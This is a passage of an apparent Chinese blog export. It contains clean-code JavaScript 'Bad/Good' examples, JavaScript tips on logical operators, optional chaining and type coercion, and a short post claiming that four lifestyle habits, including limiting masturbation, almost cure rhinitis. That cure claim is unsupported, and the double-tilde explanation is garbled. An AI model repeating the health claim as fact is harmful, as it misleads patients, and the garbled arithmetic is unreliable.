class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span> <span class="keyword">extends</span> <span class="title">Mammal</span> </span>&#123;</span><br><span class="line">  constructor(age, furColor, languageSpoken) &#123;</span><br><span class="line">    <span class="keyword">super</span>(age, furColor);</span><br><span class="line">    <span class="keyword">this</span>.languageSpoken = languageSpoken;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  speak() &#123;</span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>class虽然看起来比原型链更简洁，但是不懂原型链何来 <code>class</code></p></blockquote><ul><li><h4 id="使用链式方法"><a href="#使用链式方法" class="headerlink" title="使用链式方法"></a>使用链式方法</h4></li></ul><p><strong>Bad:</strong></p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span> &#123;</span><br><span class="line">  <span class="keyword">constructor</span>(make, model, color) &#123;</span><br><span class="line">    <span class="keyword">this</span>.make = make;</span><br><span class="line">    <span class="keyword">this</span>.model = model;</span><br><span class="line">    <span class="keyword">this</span>.color = color;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  setMake(make) &#123;</span><br><span class="line">    <span class="keyword">this</span>.make = make;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  setModel(model) &#123;</span><br><span class="line">    <span class="keyword">this</span>.model = model;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  setColor(color) &#123;</span><br><span class="line">    <span class="keyword">this</span>.color = color;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  save() &#123;</span><br><span class="line">    console.log(<span class="keyword">this</span>.make, <span class="keyword">this</span>.model, <span class="keyword">this</span>.color);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> car = new Car(<span class="string">&quot;Ford&quot;</span>, <span class="string">&quot;F-150&quot;</span>, <span class="string">&quot;red&quot;</span>);</span><br><span class="line">car.setColor(<span class="string">&quot;pink&quot;</span>);</span><br><span class="line">car.save();</span><br></pre></td></tr></table></figure><p><strong>Good:</strong></p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span> &#123;</span><br><span class="line">  <span class="keyword">constructor</span>(make, model, color) &#123;</span><br><span class="line">    <span class="keyword">this</span>.make = make;</span><br><span class="line">    <span class="keyword">this</span>.model = model;</span><br><span class="line">    <span class="keyword">this</span>.color = color;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  setMake(make) &#123;</span><br><span class="line">    <span class="keyword">this</span>.make = make;</span><br><span class="line">    <span class="comment">// <span class="doctag">NOTE:</span> Returning this for chaining</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  setModel(model) &#123;</span><br><span class="line">    <span class="keyword">this</span>.model = model;</span><br><span class="line">    <span class="comment">// <span class="doctag">NOTE:</span> Returning this for chaining</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  setColor(color) &#123;</span><br><span class="line">    <span class="keyword">this</span>.color = color;</span><br><span class="line">    <span class="comment">// <span class="doctag">NOTE:</span> Returning this for chaining</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  save() &#123;</span><br><span class="line">    console.log(<span class="keyword">this</span>.make, <span class="keyword">this</span>.model, <span class="keyword">this</span>.color);</span><br><span class="line">    <span class="comment">// <span class="doctag">NOTE:</span> Returning this for chaining</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> car = new Car(<span class="string">&quot;Ford&quot;</span>, <span class="string">&quot;F-150&quot;</span>, <span class="string">&quot;red&quot;</span>).setColor(<span class="string">&quot;pink&quot;</span>).save();</span><br></pre></td></tr></table></figure><ul><li><h4 id="更多时候我们想用的是组合而不是继承"><a href="#更多时候我们想用的是组合而不是继承" class="headerlink" title="更多时候我们想用的是组合而不是继承"></a>更多时候我们想用的是组合而不是继承</h4></li></ul><p><strong>Bad:</strong></p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Employee</span> </span>&#123;</span><br><span class="line">  constructor(name, email) &#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">    <span class="keyword">this</span>.email = email;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Bad because Employees &quot;have&quot; tax data. EmployeeTaxData is not a type of Employee</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EmployeeTaxData</span> <span class="keyword">extends</span> <span class="title">Employee</span> </span>&#123;</span><br><span class="line">  constructor(ssn, salary) &#123;</span><br><span class="line">    <span class="keyword">super</span>();</span><br><span class="line">    <span class="keyword">this</span>.ssn = ssn;</span><br><span class="line">    <span class="keyword">this</span>.salary = salary;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Good:</strong></p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">EmployeeTaxData</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">ssn</span>, <span class="params">salary</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">ssn</span> <span class="operator">=</span> <span class="variable">ssn</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">salary</span> <span class="operator">=</span> <span class="variable">salary</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Employee</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">name</span>, <span class="params">email</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> <span class="operator">=</span> <span class="variable">name</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">email</span> <span class="operator">=</span> <span class="variable">email</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">setTaxData</span>(<span class="params">ssn</span>, <span class="params">salary</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">taxData</span> <span class="operator">=</span> <span class="variable">new</span> <span class="title class_">EmployeeTaxData</span>(<span class="variable">ssn</span>, <span class="variable">salary</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><h4 id="接口隔离原则"><a href="#接口隔离原则" class="headerlink" title="接口隔离原则"></a>接口隔离原则</h4></li></ul><p><strong>Bad:</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">DOMTraverser</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">settings</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">settings</span> = settings;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">setup</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">setup</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">rootNode</span> = <span class="variable language_">this</span>.<span class="property">settings</span>.<span class="property">rootNode</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">animationModule</span>.<span class="title function_">setup</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">traverse</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> $ = <span class="keyword">new</span> <span class="title class_">DOMTraverser</span>(&#123;</span><br><span class="line">  <span class="attr">rootNode</span>: <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;body&quot;</span>),</span><br><span class="line">  <span class="title function_">animationModule</span>(<span class="params"></span>) &#123;&#125; <span class="comment">// Most of the time, we won&#x27;t need to animate when traversing.</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><strong>Good:</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">DOMTraverser</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">settings</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">settings</span> = settings;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">options</span> = settings.<span class="property">options</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">setup</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">setup</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">rootNode</span> = <span class="variable language_">this</span>.<span class="property">settings</span>.<span class="property">rootNode</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">setupOptions</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">setupOptions</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">animationModule</span>) &#123;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">traverse</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> $ = <span class="keyword">new</span> <span class="title class_">DOMTraverser</span>(&#123;</span><br><span class="line">  <span class="attr">rootNode</span>: <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;body&quot;</span>),</span><br><span class="line">  <span class="attr">options</span>: &#123;</span><br><span class="line">    <span class="title function_">animationModule</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><ul><li><h4 id="每个测试的单一原则"><a href="#每个测试的单一原则" class="headerlink" title="每个测试的单一原则"></a>每个测试的单一原则</h4></li></ul><p><strong>Bad:</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="keyword">assert</span> <span class="keyword">from</span> &quot;assert&quot;;</span><br><span class="line"></span><br><span class="line">describe(&quot;MakeMomentJSGreatAgain&quot;, () =&gt; &#123;</span><br><span class="line">  it(&quot;handles date boundaries&quot;, () =&gt; &#123;</span><br><span class="line">    let <span class="type">date</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">date</span> = <span class="built_in">new</span> MakeMomentJSGreatAgain(&quot;1/1/2015&quot;);</span><br><span class="line">    <span class="type">date</span>.addDays(<span class="number">30</span>);</span><br><span class="line">    <span class="keyword">assert</span>.equal(&quot;1/31/2015&quot;, <span class="type">date</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">date</span> = <span class="built_in">new</span> MakeMomentJSGreatAgain(&quot;2/1/2016&quot;);</span><br><span class="line">    <span class="type">date</span>.addDays(<span class="number">28</span>);</span><br><span class="line">    <span class="keyword">assert</span>.equal(&quot;02/29/2016&quot;, <span class="type">date</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">date</span> = <span class="built_in">new</span> MakeMomentJSGreatAgain(&quot;2/1/2015&quot;);</span><br><span class="line">    <span class="type">date</span>.addDays(<span class="number">28</span>);</span><br><span class="line">    <span class="keyword">assert</span>.equal(&quot;03/01/2015&quot;, <span class="type">date</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><strong>Good:</strong></p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="built_in">assert</span> <span class="keyword">from</span> <span class="string">&quot;assert&quot;</span>;</span><br><span class="line"></span><br><span class="line">describe(<span class="string">&quot;MakeMomentJSGreatAgain&quot;</span>, <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  it(<span class="string">&quot;handles 30-day months&quot;</span>, <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    const date = new MakeMomentJSGreatAgain(<span class="string">&quot;1/1/2015&quot;</span>);</span><br><span class="line">    date.addDays(<span class="number">30</span>);</span><br><span class="line">    <span class="built_in">assert</span>.equal(<span class="string">&quot;1/31/2015&quot;</span>, date);</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  it(<span class="string">&quot;handles leap year&quot;</span>, <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    const date = new MakeMomentJSGreatAgain(<span class="string">&quot;2/1/2016&quot;</span>);</span><br><span class="line">    date.addDays(<span class="number">28</span>);</span><br><span class="line">    <span class="built_in">assert</span>.equal(<span class="string">&quot;02/29/2016&quot;</span>, date);</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  it(<span class="string">&quot;handles non-leap year&quot;</span>, <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    const date = new MakeMomentJSGreatAgain(<span class="string">&quot;2/1/2015&quot;</span>);</span><br><span class="line">    date.addDays(<span class="number">28</span>);</span><br><span class="line">    <span class="built_in">assert</span>.equal(<span class="string">&quot;03/01/2015&quot;</span>, date);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h1 id="错误捕获"><a href="#错误捕获" class="headerlink" title="错误捕获"></a>错误捕获</h1><ul><li><h4 id="try…catch"><a href="#try…catch" class="headerlink" title="try…catch"></a>try…catch</h4></li></ul><p><strong>Bad:</strong></p><figure class="highlight monkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  functionThatMightThrow();</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">error</span>) &#123;</span><br><span class="line">  console.<span class="built_in">log</span>(<span class="built_in">error</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Good:</strong></p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">  <span class="built_in">functionThatMightThrow</span>();</span><br><span class="line">&#125; catch (error) &#123;</span><br><span class="line">  <span class="comment">// One option (more noisy than console.log):</span></span><br><span class="line">  console<span class="selector-class">.error</span>(error);</span><br><span class="line">  <span class="comment">// Another option:</span></span><br><span class="line">  <span class="built_in">notifyUserOfError</span>(error);</span><br><span class="line">  <span class="comment">// Another option:</span></span><br><span class="line">  <span class="built_in">reportErrorToService</span>(error);</span><br><span class="line">  <span class="comment">// OR do all three!</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><h4 id="promise也一样"><a href="#promise也一样" class="headerlink" title="promise也一样"></a>promise也一样</h4></li></ul><p><strong>Bad:</strong></p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">getdata()</span><br><span class="line">  .then(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">    functionThatMightThrow(data);</span><br><span class="line">  &#125;)</span><br><span class="line">  .catch(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(error);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><p><strong>Good:</strong></p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">getdata</span>()</span><br><span class="line">  <span class="selector-class">.then</span>(data =&gt; &#123;</span><br><span class="line">    functionThatMightThrow(data);</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="selector-class">.catch</span>(error =&gt; &#123;</span><br><span class="line">    // One option (more noisy than console.log):</span><br><span class="line">    console.<span class="built_in">error</span>(error);</span><br><span class="line">    <span class="comment">// Another option:</span></span><br><span class="line">    <span class="built_in">notifyUserOfError</span>(error);</span><br><span class="line">    <span class="comment">// Another option:</span></span><br><span class="line">    <span class="built_in">reportErrorToService</span>(error);</span><br><span class="line">    <span class="comment">// OR do all three!</span></span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>v2----鼻炎疗法</title>
      <link href="/Blog/2019/06/11/daisy/v2----%E9%BC%BB%E7%82%8E%E7%96%97%E6%B3%95/index/"/>
      <url>/Blog/2019/06/11/daisy/v2----%E9%BC%BB%E7%82%8E%E7%96%97%E6%B3%95/index/</url>
      
        <content type="html"><![CDATA[<h2 id="12-年鼻炎患者告诉你。。鼻炎做到-4-点就能几乎痊愈。。"><a href="#12-年鼻炎患者告诉你。。鼻炎做到-4-点就能几乎痊愈。。" class="headerlink" title="12 年鼻炎患者告诉你。。鼻炎做到 4 点就能几乎痊愈。。"></a>12 年鼻炎患者告诉你。。鼻炎做到 4 点就能几乎痊愈。。</h2><ol><li>戒撸 最高频率一周一次</li><li>多喝水 一天 1500 毫升</li><li>多运动 每天三公里跑步</li><li>保证睡眠 每天保证 8 小时连续睡眠</li></ol>]]></content>
      
      
      <categories>
          
          <category> daisy </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>一些 JavaScript 技巧</title>
      <link href="/Blog/2019/05/31/essay/%E4%B8%80%E4%BA%9BJavaScript%E6%8A%80%E5%B7%A7/index/"/>
      <url>/Blog/2019/05/31/essay/%E4%B8%80%E4%BA%9BJavaScript%E6%8A%80%E5%B7%A7/index/</url>
      
        <content type="html"><![CDATA[<h1 id="一、-amp-amp-和-逻辑运算符"><a href="#一、-amp-amp-和-逻辑运算符" class="headerlink" title="一、 &amp;&amp; 和 || 逻辑运算符"></a>一、 <code>&amp;&amp;</code> 和 <code>||</code> 逻辑运算符</h1><ul><li><h5 id="例一"><a href="#例一" class="headerlink" title="例一"></a>例一</h5></li></ul><p>假设我们想返回一个变量的长度，但是我们不知道变量的类型。<br>我们可以使用 <code>if/else</code> 语句来检查 <code>foo</code> 是可接受的类型，但是这可能会变得非常冗长。或运行可以帮助我们简化操作：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">return</span> (foo || []).<span class="built_in">length</span></span><br></pre></td></tr></table></figure><p>如果变量 <code>foo</code> 是 <code>true</code>，它将被返回。否则，将返回空数组的长度: <code>0</code>。</p><ul><li><h5 id="例二"><a href="#例二" class="headerlink" title="例二"></a>例二</h5></li></ul><p>你是否遇到过访问嵌套对象属性的问题？ 你可能不知道对象或其中一个子属性是否存在，这可能会导致令人沮丧的错误。<br>假设我们想在 <code>this.state</code> 中访问一个名为 <code>data</code> 的属性，但是在我们的程序成功返回一个获取请求之前，<code>data</code> 是未定义的。<br>根据我们使用它的位置，调用 <code>this.state.data</code> 可能会阻止我们的应用程序运行。 为了解决这个问题，我们可以将其做进一步的判断：</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.state.<span class="keyword">data</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.state.<span class="keyword">data</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;Fetching Data&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但这似乎很重复。 <code>||</code> 运算符提供了更简洁的解决方案：</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> (<span class="keyword">this</span>.state.<span class="keyword">data</span> || <span class="string">&#x27;Fetching Data&#x27;</span>);</span><br></pre></td></tr></table></figure><p>一个新特性: <code>Optional Chaining</code></p><h4 id="一个新特性-Optional-Chaining"><a href="#一个新特性-Optional-Chaining" class="headerlink" title="一个新特性: Optional Chaining"></a><strong>一个新特性: Optional Chaining</strong></h4><p>过去在 Object 属性链的调用中，很容易因为某个属性不存在而导致之后出现<code>Cannot read property xxx of undefined</code>的错误。</p><p>那 <code>optional chaining</code> 就是添加了<code>?.</code>这么个操作符，它会先判断前面的值，如果是 <code>null</code> 或 <code>undefined</code>，就结束调用、返回 <code>undefined</code>。</p><p>例如，我们可以将上面的示例重构为 <code>this.state.data?.()</code>。或者，如果我们主要关注<code>state</code> 是否已定义，我们可以返回<code>this.state?.data</code>。</p><p>该提案目前处于第1阶段，作为一项实验性功能。 你可以在<a href="https://github.com/tc39/proposal-optional-chaining">这里</a>阅读它，你现在可以通过Babel使用你的JavaScript，将 <a href="https://babeljs.io/docs/en/babel-plugin-proposal-optional-chaining">@babel&#x2F;plugin-proposal-optional-chaining</a>添加到你的<code>.babelrc</code>文件中。</p><h1 id="二、-转换为布尔值"><a href="#二、-转换为布尔值" class="headerlink" title="二、!! 转换为布尔值"></a>二、<code>!!</code> 转换为布尔值</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> isTrue  = !<span class="number">0</span>;</span><br><span class="line"><span class="keyword">const</span> isFalse = !<span class="number">1</span>;</span><br><span class="line"><span class="keyword">const</span> alsoFalse = !!<span class="number">0</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(isTrue); <span class="comment">// Result: true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> <span class="literal">true</span>); <span class="comment">// Result: &quot;boolean&quot;  </span></span><br></pre></td></tr></table></figure><h1 id="三、转换为数字"><a href="#三、转换为数字" class="headerlink" title="三、转换为数字"></a>三、转换为数字</h1><ul><li><code>+</code><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">let num1 = <span class="string">&quot;15&quot;</span>;</span><br><span class="line">num1 = +num1;</span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(num1); <span class="comment">// Result: 15</span></span><br><span class="line">let num2 = <span class="string">&quot;1.5&quot;</span>;</span><br><span class="line">num2 = +num2;</span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(num2); <span class="comment">// Result: 1.5</span></span><br></pre></td></tr></table></figure>这也可以用于将布尔值转换为数字，如下所示<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(+<span class="literal">true</span>);  <span class="comment">// Return: 1</span></span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(+<span class="literal">false</span>); <span class="comment">// Return: 0</span></span><br></pre></td></tr></table></figure></li><li><code>~~</code><br>在某些上下文中，+将被解释为连接操作符，而不是加法操作符。当这种情况发生时(你希望返回一个整数，而不是浮点数)，您可以使用两个波浪号:~~。</li></ul><p>连续使用两个波浪有效地否定了操作，因为— ( — n — 1) — 1 &#x3D; n + 1 — 1 &#x3D; n。 换句话说，<code>~—16</code> 等于<code>15</code>。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 